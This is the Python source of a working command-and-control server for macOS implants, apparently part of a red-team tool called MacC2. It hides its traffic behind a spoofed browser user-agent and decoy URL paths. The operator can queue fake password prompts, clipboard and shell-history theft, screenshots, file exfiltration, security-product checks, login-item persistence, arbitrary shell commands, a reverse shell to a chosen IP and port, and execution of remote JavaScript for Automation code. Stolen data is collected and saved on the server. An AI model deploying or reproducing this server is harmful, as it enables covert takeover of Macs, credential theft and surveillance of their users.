from aiohttp import web
import ssl
from datetime import datetime
import urllib.parse
import subprocess
import base64

##first set up ssl for this server to properly run on ssl:
##1. openssl req -new -newkey rsa:1024 -nodes -out ca.csr -keyout ca.key
##2. openssl x509 -trustout -signkey ca.key -days 365 -req -in ca.csr -out ca.pem
##
##3. reference ca.pem and ca.key in the "context.load_cert_chain setting below in the start_server() function
##4. can also set up iptables on the server to restrict source connections from certain ranges:
##iptables -A INPUT -i eth1 -m iprange --src-range x.x.x.x-x.x.x.x -j ACCEPT
##iptables -P INPUT DROP

cmds = {}

print("\033[1;36m+=====================================================================+")
print("SimpleC2 Server")
print("01010011 01101001 01101101 01110000 01101100 01100101 01000011 00110010")
print("+=====================================================================+\033[0m")

async def InitCall(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        peer = request.transport.get_extra_info('peername')
        host, port = peer
        print("\033[92m[+] Initial connection from ([IP],[source_port]): %s\033[0m" % str(peer))
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()
        
async def CheckIn(request):
    cmds.clear()
    peername = request.transport.get_extra_info('peername')
    host, port = peername
    cmdcounter = 0
    count2 = 0
    text = "OK"
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        peer = request.transport.get_extra_info('peername')
        host, port = peer
        timestmp = datetime.now()
        print("Timestamp: %s" % str(timestmp))
        print("[===>] Check In from ([IP],[source_port]): %s\033[0m" % str(peer))
        while True:
            command = input("\033[34m[Source: %s]>>>\033[0m " % str(peername))
            if 'help' in command:
                print("-"*100)
                print("\033[33mHelp menu:\033[0m")
                print("--->ALIASES<---")
                print(">\033[1;33msysteminfo\033[0m: Return useful system information.\033[36mMethod: NSAppleScript API calls via Objective C\033[0m")
                print(">\033[1;33mcd [directory]\033[0m: cd to the directory specified (ex: cd /home). \033[36mMethod: Python os.chdir method\033[0m")
                print(">\033[1;33mlistdir\033[0m: list files and directories. \033[36mMethod: Python glob library and os.listdir method\033[0m")
                print(">\033[1;33mdownload [filename]\033[0m: after you cd to directory of interest, download files of interest (one at a time). \033[36mMethod: Python read file libraries\033[0m")
                print(">\033[1;33mlistusers\033[0m: List local users. \033[36mMethod: Python pwd library\033[0m")
                print(">\033[1;33maddresses\033[0m: List internal address(es) for this host. \033[36mMethod: NSAppleScript API calls via Objective C\033[0m")
                print(">\033[1;33mlcwd\033[0m: Show current server working directory")
                print(">\033[1;33mwhoami\033[0m: Show current user context")
                print(">\033[1;33mcat [filename]\033[0m: Attempt to get contents of specified file")
                print(">\033[1;33mpwd\033[0m: Show working directory on host. \033[36mMethod: Python os.getcwd method\033[0m")
                print('')
                print("--->COMMANDS<---")
                print(">\033[1;33mprompt\033[0m: Propmpt the user to enter credentials. \033[36mMethod: NSAppleScript API calls via Objective C\033[0m")
                print(">\033[1;33muserhist\033[0m: Grep for interesting hosts from zsh history. \033[36mMethod: Python read file libraries\033[0m")
                print(">\033[1;33mclipboard\033[0m: Grab text in the user's clipboard. \033[36mMethod: Python AppKit NSPasteboard library\033[0m")
                print(">\033[1;33mchecksecurity\033[0m: Search for common security products. \033[36mMethod: NSWorkspace class calls via Objective C\033[0m")
                print(">\033[1;33mscreenshot\033[0m: Grap a screenshot of the OSX host. \033[36mMethod: Used xorrior's EmPyre Code here (uses Quartz CoreGraphics library)\033[0m. \033[1;91mNOT OPSEC SAFE, as this may pop up a request to the user to allow access to record screen data.\033[0m")
                print(">\033[1;33msleep [digit]\033[0m: Change sleep time")
                print(">\033[1;33mpersist\033[0m: Add Login Item persistence. Note this uses ObjC calls identified by xorrior to write global login items even if ran from an app sandbox.\033[36mMethod: Uses LSSharedFileList API calls via Objective C\033[0m")
                print(">\033[1;33munpersist\033[0m: Remove the Login Item persistence. \033[36mMethod: Uses LSSharedFileList API calls via Objective C\033[0m")
                print(">\033[1;33mshell [shell command]\033[0m: Run a shell command...Method: \033[1;91mNOT OPSEC SAFE, as this uses easily detectable command line strings\033[0m")
                print(">\033[1;33mspawn [IP]:[port]\033[0m: Send a bash interactive reverse shell to an IP:port (ex: spawnshell 10.10.10.10:443)...Method: \033[1;91mNOT OPSEC SAFE, as this uses easily detectable command line strings\033[0m")
                print(">\033[1;33mrunjxa [url]\033[0m: Execute the jxa .js code hosted at the supplied url. \033[36mMethod: NSAppleScript API calls via Objective C\033[0m")
                print('')
                print("--->OTHER<---")
                print(">\033[1;33mdone\033[0m: Send queued commands to the client for execution")
                print(">\033[1;33mexit\033[0m: Exit the session and stop the client")
                print("-"*100)

            elif 'exit' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
            
            elif 'lcwd' in command:
                x = subprocess.getstatusoutput("pwd")
                print("Current server working directory:")
                print(str(x).replace("(0, '", '').replace("')",''))
            
            elif (('pwd' in command) and ('shell' not in command)):
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
            
            elif (('cat' in command) and ('shell' not in command)):
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
                    
            elif 'listdir' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)

            elif 'whoami' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
            
            elif 'connections' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
            
            elif (('cd ' in command) and ('shell' not in command)):
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
            
            elif 'addresses' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
            
            elif 'listusers' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
            
            elif 'userhist' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
                                    
            elif 'screenshot' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)

            elif 'download ' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
        
            elif 'checksecurity' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
            
            elif command == 'persist':
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                pdata = open('MacC2_client.py','rb')
                pdata2 = pdata.read()
                pdata3 = base64.b64encode(pdata2)
                cmds["'%s'"%str(cmdcounter)] = pdata3.decode('utf8') + '+++++'
                print("\033[33mlogin item persistence queued for execution on the endpoint at next checkin\033[0m")
            
            elif 'unpersist' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
            
            elif 'prompt' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
            
            elif 'systeminfo' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
            
            elif 'clipboard' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
            
            elif 'shell ' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)

            elif 'sleep ' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)

            elif 'spawn ' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)

            elif 'runjxa ' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command + '+++++'
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
            
            elif command == 'done':
                datalist = list(cmds.values())
                
                return web.json_response(datalist)
                break
            else:
                print("[-] Command not found")

        return web.Response(text=text)
    else:
        return web.HTTPNotFound()


async def GetScreenshot(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        sdata_init = await request.read()
        timestmp = datetime.now()
        print("Timestamp: %s" % str(timestmp))
        tstamp = datetime.now()
        with open("screenshot%s.jpg" % str(tstamp), 'wb') as sshot:
            sshot.write(sdata_init)
            sshot.close()
            print("\033[92m[+] Screenshot saved to current directory\033[0m")
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def GetDownload(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        ddata_init = await request.read()
        ddata1 = urllib.parse.unquote_plus(ddata_init.decode('utf8'))
        if 'content' in ddata1:
            ddata = ddata1.replace("content=","")
            timestmp = datetime.now()
            print("Timestamp: %s" % str(timestmp))
            with open("download%s" % str(timestmp), 'w') as file:
                file.write(ddata)
                file.close()
                print("\033[92m[+] File download complete\033[0m")
            text = 'OK'
            return web.Response(text=text)
        else:
            print("[-] File Not found")
            text = 'OK'
            return web.Response(text=text)
            
    else:
        return web.HTTPNotFound()

async def GetPath(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        path = await request.read()
        timestmp = datetime.now()
        print("Timestamp: %s" % str(timestmp))
        print("\033[92m[+] Current directory path: %s\033[0m" % str(path.decode('utf8')))
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def ChangeDir(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        pathinfo = await request.read()
        timestmp = datetime.now()
        print("Timestamp: %s" % str(timestmp))
        print("\033[92m%s\033[0m" % str(pathinfo.decode('utf8')))
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def ListDir(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        listinfo = await request.read()
        listinfo2 = listinfo.decode('utf8').split(',')
        timestmp = datetime.now()
        print("Timestamp: %s" % str(timestmp))
        print("\033[92m[+] Directory Contents:\033[0m")
        for l in listinfo2:
            print(l)
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def Clipboard(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        clipinfo_init = await request.read()
  
        timestmp = datetime.now()
        print("Timestamp: %s" % str(timestmp))
        tstamp = datetime.now()
        with open("clipboard%s.txt" % str(tstamp), 'wb') as clip:
            clip.write(clipinfo_init)
            clip.close()
            print("\033[92m[+] Clipboard content saved to current directory\033[0m")
        text = 'OK'
        return web.Response(text=text)
                
    else:
        return web.HTTPNotFound()

async def Prompt(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        promptdata = await request.read()
        promptdata2 = str(promptdata.decode('utf8'))
        
        print("\033[92m[+] Prompt results:\033[0m")
        print(promptdata2)
        
        print("NOTE: The button the user clicked is noted by the 'bhit' value and the password entered is in the 'ttxt' value. Otherwise the user cancelled.")
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def SpawnShell(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        spawndata = await request.read()
        print("Results:")
        print("\033[92m%s\033[0m" % str(spawndata.decode('utf8')))
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def Addresses(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        addressdata = await request.read()
        print("\033[92m[+] Local IP Address:\033[0m")
        print(str(addressdata.decode('utf8')).replace("('utxt'(","").replace(")",""))
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def ListUsers(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        userdata = await request.read()
        userdata2 = str(userdata.decode('utf8'))
        userdata3 = userdata2.split(',')
        print("\033[92m[+] Local User Accounts Found:\033[0m")
        for user in userdata3:
            print(user)
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def UserHist(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        histdata = await request.read()
        histdata2 = str(histdata.decode('utf8'))
        print("\033[92m[+] zsh History Data:\033[0m[+] \r%s" % str(histdata2))
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def CheckSecurity(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        secdata = await request.read()
        secdata2 = str(secdata.decode('utf8'))
        print("\033[92m[+] Security product check results:\033[0m")
        print(secdata2)
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def Whoami(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        wdata = await request.read()
        timestmp = datetime.now()
        print("Timestamp: %s" % str(timestmp))
        print("\033[92m[+] Current user identity:\033[0m")
        print(str(wdata.decode('utf8')))
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def SysInfo(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        sysinfodata = await request.read()
        timestmp = datetime.now()
        print("Timestamp: %s" % str(timestmp))
        print("\033[92m[+] Basic system info:\033[0m")
        print(str(sysinfodata.decode('utf8')))
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def CatFile(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        catdata = await request.read()
        catdata2 = urllib.parse.unquote_plus(catdata.decode('utf8'))
        if 'content' in catdata2:
            filedata = catdata2.replace("content=","")
            timestmp = datetime.now()
            print("Timestamp: %s" % str(timestmp))
            print("\033[92m[+] File Content:\033[0m")
            print(filedata)
            text = 'OK'
            return web.Response(text=text)
        else:
            print("[-] File Not found")
            text = 'OK'
            return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def ShellCmd(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        cmddata = await request.read()
        timestmp = datetime.now()
        print("Timestamp: %s" % str(timestmp))
        print("\033[92m[+] Shell Command Results:\033[0m")
        cmddata2 = str(cmddata.decode('utf8'))
        cmddata3 = cmddata2.replace("(0, ","").replace(")","")
        print(cmddata3)
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def Sleeper(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        sleepdata = await request.read()
        print("[+] %s" % str(sleepdata))
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def Persist(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        returndata = await request.read()
        timestamp = datetime.now()
        print("Timestamp: %s" % str(timestamp))
        print("\033[92m%s\033[0m" % str(returndata.decode('utf8')))
        text = 'OK'
        
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def UnPersist(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        returndata = await request.read()
        timestamp = datetime.now()
        print("Timestamp: %s" % str(timestamp))
        print("\033[92m%s\033[0m" % str(returndata.decode('utf8')))
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def RunJXA(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        returndata = await request.read()
        timestamp = datetime.now()
        print("Timestamp: %s" % str(timestamp))
        print("\033[92m%s\033[0m" % str(returndata.decode('utf8')))
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()


app = web.Application(client_max_size=2000000000000000)
app.add_routes([web.get('/initializee/sequence/0', InitCall),
                web.get('/validate/status', CheckIn),
                web.post('/validatiion/profile/1', GetScreenshot),
                web.post('/validatiion/profile/2', GetDownload),
                web.post('/validatiion/profile/3', GetPath),
                web.post('/validatiion/profile/4', ChangeDir),
                web.post('/validatiion/profile/5', ListDir),
                web.post('/validatiion/profile/6', Clipboard),
                web.post('/validatiion/profile/7', Prompt),
                web.post('/validatiion/profile/8', SpawnShell),
                web.post('/validatiion/profile/9', Addresses),
                web.post('/validatiion/profile/10', ListUsers),
                web.post('/validatiion/profile/11', UserHist),
                web.post('/validatiion/profile/12', CheckSecurity),
                web.post('/validatiion/profile/13', Whoami),
                web.post('/validatiion/profile/14', SysInfo),
                web.post('/validatiion/profile/15', CatFile),
                web.post('/validatiion/profile/16', ShellCmd),
                web.post('/validatiion/profile/17', Sleeper),
                web.post('/validatiion/profile/18', Persist),
                web.post('/validatiion/profile/19', UnPersist),
                web.post('/validatiion/profile/20', RunJXA)])

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain('ca.pem','ca.key')

if __name__ == '__main__':
    web.run_app(app, ssl_context=context, port=443)
